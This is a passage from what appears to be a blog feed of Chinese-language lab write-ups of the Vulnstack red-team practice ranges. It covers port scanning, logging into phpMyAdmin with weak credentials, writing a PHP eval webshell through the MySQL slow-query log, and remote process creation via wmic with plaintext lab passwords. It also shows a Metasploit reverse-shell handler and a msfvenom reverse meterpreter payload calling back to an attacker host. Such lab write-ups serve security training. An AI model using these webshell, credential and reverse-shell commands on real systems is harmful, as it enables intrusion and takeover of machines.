+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;域控机：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic /node:10.10.10.128 /user:administrator@de1ay.com /password:1qaz@WSX process call create &amp;#34;C:\shell3.exe&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic：Windows Management Instrumentation Command-line，允许你通过命令行访问和管理系统管理信息。
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/node:10.10.10.128：指定要操作的远程计算机的 IP 地址。
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/user:administrator@de1ay.com：指定用于登录到远程计算机的用户名。
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/password:1qaz@WSX：指定用于登录的密码。
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;process call create &amp;#34;C:\shell3.exe&amp;#34;：在远程计算机上创建并运行 C:\shell3.exe 进程。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726409658453-7c98ccd1-a5fd-4bab-8590-0deb81f6d7a2.png&#34;
+	width=&#34;760&#34;
+	height=&#34;195&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726409658453-7c98ccd1-a5fd-4bab-8590-0deb81f6d7a2_hu97f935a52cdbf84752fbc5149bc6b1d9_69433_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726409658453-7c98ccd1-a5fd-4bab-8590-0deb81f6d7a2_hu97f935a52cdbf84752fbc5149bc6b1d9_69433_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;389&#34;
+		data-flex-basis=&#34;935px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411631348-a59b39a4-e1ce-42f6-91e3-c16ff7cb6ccc.png&#34;
+	width=&#34;515&#34;
+	height=&#34;348&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411631348-a59b39a4-e1ce-42f6-91e3-c16ff7cb6ccc_huca67d03ba191304ad516cd156ae4e12b_80775_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411631348-a59b39a4-e1ce-42f6-91e3-c16ff7cb6ccc_huca67d03ba191304ad516cd156ae4e12b_80775_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;147&#34;
+		data-flex-basis=&#34;355px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411647234-e9cd33f6-e4f7-47da-8934-d6d4395048be.png&#34;
+	width=&#34;867&#34;
+	height=&#34;229&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411647234-e9cd33f6-e4f7-47da-8934-d6d4395048be_hu0099f518254d6695dd62fbf985b0a92f_70346_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411647234-e9cd33f6-e4f7-47da-8934-d6d4395048be_hu0099f518254d6695dd62fbf985b0a92f_70346_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;378&#34;
+		data-flex-basis=&#34;908px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411658387-e85856ad-3bba-425f-b3e5-9498e0730bc3.png&#34;
+	width=&#34;512&#34;
+	height=&#34;252&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411658387-e85856ad-3bba-425f-b3e5-9498e0730bc3_hu3ddbb5aecad1fbf488e29eea449dfc22_21223_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411658387-e85856ad-3bba-425f-b3e5-9498e0730bc3_hu3ddbb5aecad1fbf488e29eea449dfc22_21223_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;203&#34;
+		data-flex-basis=&#34;487px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能看到shell是上去了,但是一直连不上,不知道啥问题&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411675190-b1e9f17f-8b77-4455-99c2-6a0797ea9641.png&#34;
+	width=&#34;571&#34;
+	height=&#34;250&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411675190-b1e9f17f-8b77-4455-99c2-6a0797ea9641_hu40941a51336b532d6e79b3343df8bd46_69059_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726411675190-b1e9f17f-8b77-4455-99c2-6a0797ea9641_hu40941a51336b532d6e79b3343df8bd46_69059_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;548px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;nmap扫到了3389端口&lt;/p&gt;
+&lt;p&gt;有账号密码可以远程连接&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;de1ay:1qaz@WSX&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726469254950-8019d0b1-563f-4b0c-9af4-dbc978b8cce4.png&#34;
+	width=&#34;779&#34;
+	height=&#34;588&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726469254950-8019d0b1-563f-4b0c-9af4-dbc978b8cce4_hue5b69293b956dbe23543af274e7e0fe2_64509_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack2/1726469254950-8019d0b1-563f-4b0c-9af4-dbc978b8cce4_hue5b69293b956dbe23543af274e7e0fe2_64509_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;132&#34;
+		data-flex-basis=&#34;317px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Vulnstack1</title>
+        <link>https://gsygsr.github.io/shentou/vulnstack/vulnstack1/</link>
+        <pubDate>Mon, 03 Mar 2025 14:57:12 +0800</pubDate>
+        
+        <guid>https://gsygsr.github.io/shentou/vulnstack/vulnstack1/</guid>
+        <description>&lt;img src="https://gsygsr.github.io/shentou/vulnstack/vulnstack1/14.jpg" alt="Featured image of post Vulnstack1" /&gt;&lt;h2 id=&#34;font-stylecolorrgb33-37-41靶场描述font&#34;&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;靶场描述&lt;/font&gt;
+&lt;/h2&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(33, 37, 41);&#34;&gt;网络拓扑图&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720680919850-cd5ffce8-773d-4d48-a974-28ff08f9124d.png&#34;
+	width=&#34;1072&#34;
+	height=&#34;535&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720680919850-cd5ffce8-773d-4d48-a974-28ff08f9124d_hu92dfa5943a313d668f9139c88391b813_240469_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720680919850-cd5ffce8-773d-4d48-a974-28ff08f9124d_hu92dfa5943a313d668f9139c88391b813_240469_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;200&#34;
+		data-flex-basis=&#34;480px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;靶场搭建&#34;&gt;靶场搭建
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720680944718-511d4c8e-7966-4f8d-a297-87f83dfa2baa.png&#34;
+	width=&#34;337&#34;
+	height=&#34;149&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720680944718-511d4c8e-7966-4f8d-a297-87f83dfa2baa_hu9b023e32bc162235a6659e0c3146914a_7174_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720680944718-511d4c8e-7966-4f8d-a297-87f83dfa2baa_hu9b023e32bc162235a6659e0c3146914a_7174_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;226&#34;
+		data-flex-basis=&#34;542px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;VM1为win7,VM2为win2003,VM3为win2008&lt;/p&gt;
+&lt;p&gt;VM1作为内外网的枢纽,要内外网联通&lt;/p&gt;
+&lt;p&gt;三台靶机要在一个内网里,	网络适配器都要选仅主机,VM1要多弄个网卡选择NAT模式&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720681389150-aacdc8de-0729-4265-a2b6-626bcac10ad4.png&#34;
+	width=&#34;373&#34;
+	height=&#34;370&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720681389150-aacdc8de-0729-4265-a2b6-626bcac10ad4_huf5991980b549d012ee7bcd26af8b75e6_21857_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720681389150-aacdc8de-0729-4265-a2b6-626bcac10ad4_huf5991980b549d012ee7bcd26af8b75e6_21857_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;100&#34;
+		data-flex-basis=&#34;241px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看网络是否联通&lt;/p&gt;
+&lt;p&gt;ip:&lt;/p&gt;
+&lt;p&gt;win7 外:192.168.184.143 内:192.168.52.143&lt;/p&gt;
+&lt;p&gt;win2003 :192.168.52.141&lt;/p&gt;
+&lt;p&gt;win2008 :192.168.52.138&lt;/p&gt;
+&lt;p&gt;VM1可以ping通外网和内网&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720682234576-e958bf79-aecd-4196-b89b-c86682cef91c.png&#34;
+	width=&#34;669&#34;
+	height=&#34;415&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720682234576-e958bf79-aecd-4196-b89b-c86682cef91c_hu05919fa0745793d47e27d083f6e5516c_26562_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720682234576-e958bf79-aecd-4196-b89b-c86682cef91c_hu05919fa0745793d47e27d083f6e5516c_26562_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;161&#34;
+		data-flex-basis=&#34;386px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;而用kali不能ping通内网,能ping通VM1的外网&lt;/p&gt;
+&lt;p&gt;说明靶场环境搭建好了&lt;/p&gt;
+&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
+&lt;/h2&gt;&lt;h3 id=&#34;探测主机&#34;&gt;探测主机
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720682514762-b9ea25ad-cf29-4870-8c71-14f05c985fd5.png&#34;
+	width=&#34;377&#34;
+	height=&#34;152&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720682514762-b9ea25ad-cf29-4870-8c71-14f05c985fd5_hua2a37fc3da91ff291ebb623364bfb148_64404_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720682514762-b9ea25ad-cf29-4870-8c71-14f05c985fd5_hua2a37fc3da91ff291ebb623364bfb148_64404_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;248&#34;
+		data-flex-basis=&#34;595px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能探测到VM1的外网&lt;/p&gt;
+&lt;h3 id=&#34;扫描端口&#34;&gt;扫描端口
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720683463475-31b8c6dc-d8a9-4e96-a564-8fa0b1c258bd.png&#34;
+	width=&#34;1033&#34;
+	height=&#34;270&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720683463475-31b8c6dc-d8a9-4e96-a564-8fa0b1c258bd_hu6cb4640dfe57431320dd1a94612a48ea_220978_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720683463475-31b8c6dc-d8a9-4e96-a564-8fa0b1c258bd_hu6cb4640dfe57431320dd1a94612a48ea_220978_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;382&#34;
+		data-flex-basis=&#34;918px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问80端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720683786088-05b29fc8-6a1b-4f9a-9f80-a9b359f5aa2e.png&#34;
+	width=&#34;1114&#34;
+	height=&#34;583&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720683786088-05b29fc8-6a1b-4f9a-9f80-a9b359f5aa2e_hu25c43e3b67f2eca87ece53fcb5cf30c4_117505_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720683786088-05b29fc8-6a1b-4f9a-9f80-a9b359f5aa2e_hu25c43e3b67f2eca87ece53fcb5cf30c4_117505_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;191&#34;
+		data-flex-basis=&#34;458px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;扫目录&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720684420952-eaee2d9d-93c4-4002-a1a6-447a67cc3ac2.png&#34;
+	width=&#34;779&#34;
+	height=&#34;607&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720684420952-eaee2d9d-93c4-4002-a1a6-447a67cc3ac2_hu3eb5452443a1ce0f269116e7e6fe2be6_368486_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720684420952-eaee2d9d-93c4-4002-a1a6-447a67cc3ac2_hu3eb5452443a1ce0f269116e7e6fe2be6_368486_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;128&#34;
+		data-flex-basis=&#34;308px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;外网渗透&#34;&gt;外网渗透
+&lt;/h2&gt;&lt;h3 id=&#34;弱口令&#34;&gt;弱口令
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;root/root&lt;/code&gt;登录到phpadmin后台&lt;/p&gt;
+&lt;h3 id=&#34;数据库写shell&#34;&gt;数据库写shell
+&lt;/h3&gt;&lt;p&gt;可以通过&lt;code&gt;into outfile&lt;/code&gt;或者日志写入shell&lt;/p&gt;
+&lt;p&gt;前提是&lt;code&gt;secure_file_priv&lt;/code&gt;的值是空&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;SHOWGLOBALVARIABLESLIKE&#39;%secure%&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685571465-5ae20f22-060f-4d1d-a3ef-1e33f4c9f6e1.png&#34;
+	width=&#34;892&#34;
+	height=&#34;378&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685571465-5ae20f22-060f-4d1d-a3ef-1e33f4c9f6e1_hufd180e47007c70dc23908645120d96b2_19538_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685571465-5ae20f22-060f-4d1d-a3ef-1e33f4c9f6e1_hufd180e47007c70dc23908645120d96b2_19538_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;235&#34;
+		data-flex-basis=&#34;566px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不允许通过into outfile来写shell&lt;/p&gt;
+&lt;p&gt;慢查询日志绕过secure_file_priv写shell&#39;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;查看慢查询日志开启情况&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;show variables like &#39;%slow_query_log%&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685777944-9a7e1de2-cdb4-4d25-aacc-864aa5b90d22.png&#34;
+	width=&#34;638&#34;
+	height=&#34;315&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685777944-9a7e1de2-cdb4-4d25-aacc-864aa5b90d22_hu54b3c49d89bc5412315a520ef877ab7d_18413_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685777944-9a7e1de2-cdb4-4d25-aacc-864aa5b90d22_hu54b3c49d89bc5412315a520ef877ab7d_18413_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;202&#34;
+		data-flex-basis=&#34;486px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;开启慢查询日志&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set global slow_query_log=1;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685821244-3d5714f0-d7bb-4f1f-b0e8-7f67412878ed.png&#34;
+	width=&#34;450&#34;
+	height=&#34;294&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685821244-3d5714f0-d7bb-4f1f-b0e8-7f67412878ed_hu1a237115e9c8adc60291c8c02b4053e6_17251_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720685821244-3d5714f0-d7bb-4f1f-b0e8-7f67412878ed_hu1a237115e9c8adc60291c8c02b4053e6_17251_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;367px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;修改日志文件存储的绝对路径&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set global slow_query_log_file=&#39;C:/phpStudy/WWW/4449.php&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686074876-557965c6-418e-4379-886a-c21842d82c25.png&#34;
+	width=&#34;722&#34;
+	height=&#34;301&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686074876-557965c6-418e-4379-886a-c21842d82c25_hu71d7dddc2b6dc139bc6f5db8aa38a492_23396_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686074876-557965c6-418e-4379-886a-c21842d82c25_hu71d7dddc2b6dc139bc6f5db8aa38a492_23396_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;239&#34;
+		data-flex-basis=&#34;575px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;向日志文件中写入shellselect&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select &#39;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&#39; or sleep(11);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686531109-2a23aedc-43fd-4252-8ab8-c8ee2f5088f7.png&#34;
+	width=&#34;685&#34;
+	height=&#34;247&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686531109-2a23aedc-43fd-4252-8ab8-c8ee2f5088f7_hucc02cf2cae800fda40af55e90cb6add5_21578_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686531109-2a23aedc-43fd-4252-8ab8-c8ee2f5088f7_hucc02cf2cae800fda40af55e90cb6add5_21578_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;277&#34;
+		data-flex-basis=&#34;665px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;show global variables like &#39;%long_query_time%&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;执行成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686602300-68637658-b1cf-476a-bcc0-2ce3de1940e9.png&#34;
+	width=&#34;1277&#34;
+	height=&#34;828&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686602300-68637658-b1cf-476a-bcc0-2ce3de1940e9_hu429e88163a80ee6fce6daa1f54f9eb02_115513_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720686602300-68637658-b1cf-476a-bcc0-2ce3de1940e9_hu429e88163a80ee6fce6daa1f54f9eb02_115513_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;154&#34;
+		data-flex-basis=&#34;370px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;直接写个bash反弹getshell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720687064508-a2496caa-aed6-4f74-93a7-3b8105071a2b.png&#34;
+	width=&#34;842&#34;
+	height=&#34;169&#34;
+	srcset=&#34;https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720687064508-a2496caa-aed6-4f74-93a7-3b8105071a2b_hu134681fd6f97dd9992b0baa9defd2f94_9109_480x0_resize_box_3.png 480w, https://gsygsr.github.io/shentou/vulnstack/vulnstack1/1720687064508-a2496caa-aed6-4f74-93a7-3b8105071a2b_hu134681fd6f97dd9992b0baa9defd2f94_9109_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;498&#34;
+		data-flex-basis=&#34;1195px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;好像弹不成功&lt;/p&gt;
+&lt;p&gt;那就用蚁剑连了&lt;/p&gt;
+&lt;h2 id=&#34;后渗透&#34;&gt;后渗透
+&lt;/h2&gt;&lt;h3 id=&#34;msf&#34;&gt;msf
+&lt;/h3&gt;&lt;p&gt;msf&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set payload windows/x64/meterpreter_reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set lhost 192.168.184.128
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set lport 1234
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.184.128 lport=1234 -f exe -o run.exe&lt;/code&gt;&lt;/p&gt;
